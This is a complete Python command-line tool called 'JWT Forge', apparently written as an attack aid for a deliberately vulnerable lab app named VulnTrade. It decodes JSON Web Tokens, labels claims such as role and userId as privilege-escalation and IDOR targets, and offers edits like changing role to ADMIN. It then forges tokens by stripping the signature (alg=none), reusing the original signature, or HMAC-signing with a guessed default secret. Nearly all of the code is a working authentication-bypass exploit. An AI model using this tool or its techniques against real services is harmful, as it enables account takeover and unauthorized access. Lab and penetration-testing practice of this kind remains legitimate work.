#!/usr/bin/env python3
"""
JWT Forge — 0xj4f's Token Editor for VulnTrade

Paste a token. Analyze. Edit. Forge. Copy. Done.

Usage:
    python3 jwt.py                     # interactive mode
    python3 jwt.py <token>             # pass token as argument
    echo <token> | python3 jwt.py -    # pipe from stdin
"""

import base64
import hashlib
import hmac
import json
import os
import sys
import time

# ── ANSI Colors ────────────────────────────────────────────────────────────

class C:
    RST     = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    ITALIC  = "\033[3m"
    ULINE   = "\033[4m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    BRED    = "\033[91m"
    BGREEN  = "\033[92m"
    BYELLOW = "\033[93m"
    BCYAN   = "\033[96m"
    BG_RED  = "\033[41m"
    BG_GREEN= "\033[42m"
    BG_BLUE = "\033[44m"
    BG_GRAY = "\033[48;5;236m"

def w(n=80):
    """Terminal width."""
    try:
        return os.get_terminal_size().columns
    except:
        return n

# ── Base64url ──────────────────────────────────────────────────────────────

def b64url_decode(data):
    rem = len(data) % 4
    if rem: data += "=" * (4 - rem)
    return base64.urlsafe_b64decode(data.encode())

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# ── HMAC Signing ───────────────────────────────────────────────────────────

def hmac_sign(header_b64, payload_b64, secret, alg="HS256"):
    """Sign JWT with HMAC. Tries both raw UTF-8 and base64-decoded key
    to match Java jjwt behavior (which base64-decodes the secret string)."""
    msg = f"{header_b64}.{payload_b64}".encode()

    # jjwt's .signWith(alg, stringSecret) base64-decodes the string as key bytes.
    # If that fails (not valid base64), it falls back to raw UTF-8 bytes.
    try:
        key = base64.b64decode(secret)
    except Exception:
        key = secret.encode()

    if alg == "HS256":
        sig = hmac.new(key, msg, hashlib.sha256).digest()
    elif alg == "HS384":
        sig = hmac.new(key, msg, hashlib.sha384).digest()
    elif alg == "HS512":
        sig = hmac.new(key, msg, hashlib.sha512).digest()
    else:
        return ""
    return b64url_encode(sig)

# ── JWT Parsing ────────────────────────────────────────────────────────────

def parse_jwt(token):
    token = token.strip()
    parts = token.split(".")
    if len(parts) != 3:
        print(f"\n  {C.RED}{C.BOLD}  Invalid JWT — expected 3 dot-separated parts, got {len(parts)}{C.RST}")
        sys.exit(1)
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception as e:
        print(f"\n  {C.RED}{C.BOLD}  Decode error: {e}{C.RST}")
        sys.exit(1)
    return header, payload, parts[2]

# ── Display ────────────────────────────────────────────────────────────────

def print_banner():
    cols = w()
    print()
    print(f"  {C.BG_GRAY}{C.BCYAN}{C.BOLD}{'':^{cols-4}}{C.RST}")
    print(f"  {C.BG_GRAY}{C.BCYAN}{C.BOLD}{'JWT Forge':^{cols-4}}{C.RST}")
    print(f"  {C.BG_GRAY}{C.DIM}{'0xj4f\'s Token Editor':^{cols-4}}{C.RST}")
    print(f"  {C.BG_GRAY}{C.BCYAN}{C.BOLD}{'':^{cols-4}}{C.RST}")
    print()

def print_section(title, icon=""):
    cols = w()
    line = f"  {icon}  {title}  "
    pad = cols - len(line) + len(icon)
    print(f"\n{C.CYAN}{C.BOLD}  {'─' * (cols - 4)}{C.RST}")
    print(f"{C.CYAN}{C.BOLD}  {icon}  {title}{C.RST}")
    print(f"{C.CYAN}{C.BOLD}  {'─' * (cols - 4)}{C.RST}")

def print_kv(key, value, indent=4, color=C.WHITE):
    """Print a key-value pair with alignment."""
    k = f"{C.DIM}{key}{C.RST}"
    v = f"{color}{C.BOLD}{value}{C.RST}"
    print(f"{' ' * indent}{k:>36s}  {v}")

def print_claim(idx, key, value, vtype, flag=""):
    """Print a single JWT claim as a table row."""
    idx_s = f"{C.DIM}{idx:>2}{C.RST}"
    key_s = f"{C.BCYAN}{key}{C.RST}"
    flag_s = f"  {C.BYELLOW}{flag}{C.RST}" if flag else ""

    # Format value based on type
    if isinstance(value, bool):
        val_s = f"{C.MAGENTA}{value}{C.RST}"
    elif isinstance(value, int) and key in ("exp", "iat", "nbf"):
        dt = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(value))
        val_s = f"{C.GREEN}{value}{C.RST}  {C.DIM}({dt}){C.RST}"
    elif isinstance(value, (int, float)):
        val_s = f"{C.MAGENTA}{value}{C.RST}"
    elif isinstance(value, str):
        val_s = f"{C.WHITE}\"{value}\"{C.RST}"
    else:
        val_s = f"{C.WHITE}{json.dumps(value)}{C.RST}"

    type_s = f"{C.DIM}{vtype}{C.RST}"
    print(f"  {idx_s}  {key_s:<28s} {val_s}  {type_s}{flag_s}")

def type_name(v):
    if isinstance(v, bool): return "bool"
    if isinstance(v, int): return "int"
    if isinstance(v, float): return "float"
    if isinstance(v, str): return "str"
    if isinstance(v, list): return "list"
    if isinstance(v, dict): return "dict"
    return type(v).__name__

# ── Analysis ───────────────────────────────────────────────────────────────

def analyze(header, payload, signature):
    print_section("HEADER", "\U0001f4e6")
    for k, v in header.items():
        print(f"    {C.DIM}{k}:{C.RST}  {C.BOLD}{v}{C.RST}")

    print_section("CLAIMS", "\U0001f50d")
    print(f"  {C.DIM}{'#':>2}  {'claim':<24s} {'value':<40s}  {'type'}{C.RST}")
    print(f"  {C.DIM}{'─' * (w() - 6)}{C.RST}")

    flags = []
    for i, (k, v) in enumerate(payload.items()):
        flag = ""
        if k == "role":
            flag = "ATTACK TARGET" if v in ("TRADER", "USER", "API") else "ELEVATED" if v == "ADMIN" else ""
        elif k == "exp":
            flag = "EXPIRED" if time.time() > v else "VALID"
        elif k == "sub":
            flag = "identity"
        elif k == "userId":
            flag = "IDOR target"
        elif k in ("account_level", "accountLevel", "level"):
            flag = "PRIVESC target"
        print_claim(i, k, v, type_name(v), flag)

    # Security summary
    print_section("SECURITY", "\u26a0\ufe0f")
    alg = header.get("alg", "none")

    if alg.lower() == "none":
        print(f"    {C.BG_RED}{C.WHITE}{C.BOLD}  CRITICAL: alg=none — token is unsigned  {C.RST}")
    elif alg.startswith("HS"):
        print(f"    {C.BYELLOW}Algorithm:{C.RST} {C.BOLD}{alg}{C.RST} {C.DIM}(symmetric — needs shared secret){C.RST}")
        print(f"    {C.BYELLOW}Strategy:{C.RST}  Forge with known secret, or switch to alg=none")
    elif alg.startswith("RS") or alg.startswith("PS") or alg.startswith("ES"):
        print(f"    {C.BRED}Algorithm:{C.RST} {C.BOLD}{alg}{C.RST} {C.DIM}(asymmetric — needs private key){C.RST}")
        print(f"    {C.BRED}Strategy:{C.RST}  Try alg=none, or key confusion (RS→HS){C.RST}")

    exp = payload.get("exp")
    if exp:
        remaining = exp - time.time()
        if remaining > 0:
            hrs = int(remaining // 3600)
            mins = int((remaining % 3600) // 60)
            print(f"    {C.GREEN}Expires:{C.RST}   {C.BOLD}{hrs}h {mins}m remaining{C.RST}")
        else:
            elapsed = abs(remaining)
            hrs = int(elapsed // 3600)
            print(f"    {C.RED}Expired:{C.RST}   {C.BOLD}{hrs}h ago{C.RST} {C.DIM}(may still work if server skips exp check){C.RST}")

    sig_len = len(signature) if signature else 0
    print(f"    {C.DIM}Signature: {sig_len} chars ({('empty' if sig_len == 0 else 'present')}){C.RST}")

# ── Interactive Editor ─────────────────────────────────────────────────────

def edit_claims(header, payload):
    """Inline claim editor. Returns modified header and payload."""
    modified_header = dict(header)
    modified_payload = dict(payload)
    changes = []

    print_section("EDIT CLAIMS", "\u270f\ufe0f")
    print(f"    {C.DIM}Enter claim number to edit, or:{C.RST}")
    print(f"    {C.CYAN}a{C.RST} = add new claim    {C.CYAN}d{C.RST} = delete claim    {C.CYAN}alg{C.RST} = change algorithm")
    print(f"    {C.CYAN}done{C.RST} = finish editing")
    print()

    keys = list(modified_payload.keys())

    while True:
        choice = input(f"  {C.BCYAN}edit>{C.RST} ").strip().lower()

        if choice in ("done", "q", "exit", ""):
            break

        elif choice == "alg":
            old_alg = modified_header.get("alg", "none")
            print(f"    {C.DIM}current: {old_alg}{C.RST}")
            print(f"    {C.DIM}options: none, HS256, HS384, HS512, RS256{C.RST}")
            new_alg = input(f"    {C.BYELLOW}new alg>{C.RST} ").strip()
            if new_alg:
                modified_header["alg"] = new_alg
                changes.append(("alg", old_alg, new_alg))
                print(f"    {C.GREEN}alg: {old_alg} → {new_alg}{C.RST}")

        elif choice == "a":
            key = input(f"    {C.BYELLOW}claim name>{C.RST} ").strip()
            if not key:
                continue
            val = input(f"    {C.BYELLOW}value>{C.RST} ").strip()
            val = _cast(val)
            modified_payload[key] = val
            keys = list(modified_payload.keys())
            changes.append((key, None, val))
            print(f"    {C.GREEN}+ {key} = {val}{C.RST}")

        elif choice == "d":
            key = input(f"    {C.BYELLOW}claim to delete>{C.RST} ").strip()
            if key in modified_payload:
                old = modified_payload.pop(key)
                keys = list(modified_payload.keys())
                changes.append((key, old, "DELETED"))
                print(f"    {C.RED}- {key}{C.RST}")
            else:
                print(f"    {C.DIM}not found{C.RST}")

        elif choice.isdigit():
            idx = int(choice)
            if 0 <= idx < len(keys):
                key = keys[idx]
                old_val = modified_payload[key]
                print(f"    {C.DIM}{key}: {old_val}{C.RST}")

                # Smart suggestions
                suggestions = _suggest(key, old_val)
                if suggestions:
                    print(f"    {C.DIM}suggestions: {', '.join(str(s) for s in suggestions)}{C.RST}")

                new_val = input(f"    {C.BYELLOW}new value>{C.RST} ").strip()
                if new_val:
                    new_val = _cast(new_val)
                    modified_payload[key] = new_val
                    changes.append((key, old_val, new_val))
                    print(f"    {C.GREEN}{key}: {old_val} → {new_val}{C.RST}")
            else:
                print(f"    {C.DIM}invalid index (0-{len(keys)-1}){C.RST}")

        else:
            # Try as claim name directly
            if choice in modified_payload:
                old_val = modified_payload[choice]
                print(f"    {C.DIM}{choice}: {old_val}{C.RST}")
                new_val = input(f"    {C.BYELLOW}new value>{C.RST} ").strip()
                if new_val:
                    new_val = _cast(new_val)
                    modified_payload[choice] = new_val
                    changes.append((choice, old_val, new_val))
                    print(f"    {C.GREEN}{choice}: {old_val} → {new_val}{C.RST}")
            else:
                print(f"    {C.DIM}unknown command: {choice}{C.RST}")

    return modified_header, modified_payload, changes

def _cast(val):
    """Smart type casting for user input."""
    if val.lower() == "true": return True
    if val.lower() == "false": return False
    if val.lower() == "null": return None
    try: return int(val)
    except ValueError: pass
    try: return float(val)
    except ValueError: pass
    return val

def _suggest(key, current):
    """Context-aware suggestions for common JWT claims."""
    k = key.lower()
    if k == "role":
        opts = {"ADMIN", "TRADER", "DEVELOPER", "API", "USER"}
        opts.discard(str(current))
        return sorted(opts)
    if k in ("userid", "user_id", "uid"):
        return [1, 2, 3] if current not in (1, 2, 3) else [current - 1, current + 1]
    if k in ("account_level", "accountlevel", "level"):
        return ["GOLD", "PLATINUM", "VIP", "ADMIN"]
    if k == "exp":
        future = int(time.time()) + 86400 * 30
        return [future, "(+30 days)"]
    if k == "sub" and isinstance(current, str):
        return ["admin", "trader1", "dev"]
    return []

# ── Forge ──────────────────────────────────────────────────────────────────

def forge(header, payload, original_sig):
    """Choose attack strategy and build the token."""
    print_section("FORGE TOKEN", "\U0001f525")

    alg = header.get("alg", "none")

    print(f"    {C.BOLD}1{C.RST}  {C.WHITE}alg=none{C.RST}         {C.DIM}Remove signature entirely{C.RST}")
    print(f"    {C.BOLD}2{C.RST}  {C.WHITE}Keep signature{C.RST}   {C.DIM}Reuse original sig (works if server skips verify){C.RST}")
    print(f"    {C.BOLD}3{C.RST}  {C.WHITE}Sign with secret{C.RST} {C.DIM}HMAC sign with a known key{C.RST}")
    print()

    choice = input(f"  {C.BCYAN}strategy>{C.RST} ").strip()

    h_json = json.dumps(header, separators=(",", ":"))
    p_json = json.dumps(payload, separators=(",", ":"))

    if choice == "1":
        # alg:none attack
        forge_header = dict(header)
        forge_header["alg"] = "none"
        h_json = json.dumps(forge_header, separators=(",", ":"))
        h_b64 = b64url_encode(h_json)
        p_b64 = b64url_encode(p_json)
        token = f"{h_b64}.{p_b64}."
        strategy = "alg=none"

    elif choice == "2":
        # Keep original signature
        h_b64 = b64url_encode(h_json)
        p_b64 = b64url_encode(p_json)
        token = f"{h_b64}.{p_b64}.{original_sig}"
        strategy = "original signature reused"

    elif choice == "3":
        # Sign with secret
        print(f"    {C.DIM}default: vulntrade-secret{C.RST}")
        secret = input(f"    {C.BYELLOW}secret>{C.RST} ").strip()
        if not secret:
            secret = "vulntrade-secret"

        sign_alg = alg if alg.startswith("HS") else "HS256"
        if not alg.startswith("HS"):
            header["alg"] = sign_alg
            h_json = json.dumps(header, separators=(",", ":"))

        h_b64 = b64url_encode(h_json)
        p_b64 = b64url_encode(p_json)
        sig = hmac_sign(h_b64, p_b64, secret, sign_alg)
        token = f"{h_b64}.{p_b64}.{sig}"
        strategy = f"signed with {sign_alg} (secret: {secret})"

    else:
        # Default: alg=none
        forge_header = dict(header)
        forge_header["alg"] = "none"
        h_json = json.dumps(forge_header, separators=(",", ":"))
        h_b64 = b64url_encode(h_json)
        p_b64 = b64url_encode(p_json)
        token = f"{h_b64}.{p_b64}."
        strategy = "alg=none (default)"

    return token, strategy

# ── Output ─────────────────────────────────────────────────────────────────

def print_result(token, strategy, changes):
    cols = w()

    print_section("FORGED TOKEN", "\U0001f3af")

    if changes:
        print(f"\n  {C.DIM}Changes applied:{C.RST}")
        for key, old, new in changes:
            if old is None:
                print(f"    {C.GREEN}+ {key} = {new}{C.RST}")
            elif new == "DELETED":
                print(f"    {C.RED}- {key} (was: {old}){C.RST}")
            else:
                print(f"    {C.BYELLOW}{key}:{C.RST} {C.RED}{old}{C.RST} {C.DIM}→{C.RST} {C.GREEN}{new}{C.RST}")

    print(f"\n  {C.DIM}Strategy: {strategy}{C.RST}")

    # The token itself — clean, ready to copy
    print(f"\n  {C.CYAN}{'─' * (cols - 4)}{C.RST}")
    print(f"\n  {C.BGREEN}{C.BOLD}{token}{C.RST}")
    print(f"\n  {C.CYAN}{'─' * (cols - 4)}{C.RST}")

    # Try to copy to clipboard
    copied = False
    try:
        import subprocess
        if sys.platform == "darwin":
            subprocess.run(["pbcopy"], input=token.encode(), check=True)
            copied = True
        elif sys.platform == "linux":
            subprocess.run(["xclip", "-selection", "clipboard"], input=token.encode(), check=True)
            copied = True
    except:
        pass

    if copied:
        print(f"\n  {C.GREEN}{C.BOLD}  Copied to clipboard{C.RST}")
    else:
        print(f"\n  {C.DIM}  Select and copy the token above{C.RST}")

    print()

# ── Main ───────────────────────────────────────────────────────────────────

def main():
    print_banner()

    # Get token from argument, stdin, or prompt
    if len(sys.argv) > 1:
        if sys.argv[1] == "-":
            token = sys.stdin.readline().strip()
        else:
            token = sys.argv[1].strip()
    else:
        print(f"  {C.DIM}Paste your JWT token below:{C.RST}")
        token = input(f"\n  {C.BCYAN}token>{C.RST} ").strip()

    if not token or token.count(".") != 2:
        print(f"\n  {C.RED}Invalid JWT format.{C.RST}")
        return

    # Parse and analyze
    header, payload, signature = parse_jwt(token)
    analyze(header, payload, signature)

    # Edit
    new_header, new_payload, changes = edit_claims(header, payload)

    # Forge
    forged_token, strategy = forge(new_header, new_payload, signature)

    # Output
    print_result(forged_token, strategy, changes)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {C.DIM}interrupted{C.RST}\n")
        sys.exit(0)
    except EOFError:
        print(f"\n\n  {C.DIM}done{C.RST}\n")
        sys.exit(0)
